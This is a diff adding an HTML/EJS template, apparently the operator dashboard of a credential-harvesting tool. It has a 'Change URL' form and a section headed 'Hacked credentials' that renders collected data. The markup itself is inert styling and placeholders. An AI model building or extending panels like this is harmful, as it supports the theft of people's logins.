@@ -1,0 +1,44 @@
+<html>
+<head>
+<title>Hacked users</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body{
+	background-color: #0A1322;
+}
+#url{
+ width: 100%;
+ background-color: #171C23;
+ color: white;
+ padding: 10px;
+}
+#con{
+ padding: 10px;
+ margin: 30px;
+ background-color: #060C13
+}
+p{
+ color: white;
+}
+h1{
+ color: white;
+}
+#submit{
+ background-color: #20292F;
+ color: white;
+}
+</style>
+</head>
+<body>
+<div id="container">
+ <div id="con">
+  <form method="post" action="/url">
+  <input id="url" type="text" name="url" value="<%= link %>">
+  <input type="submit" id="submit" value="Change URL">
+  </form>
+  <h1>Hacked credentials</h1>
+  <p><%= data %></p>
+ </div>
+</div>
+</body>
+</html>
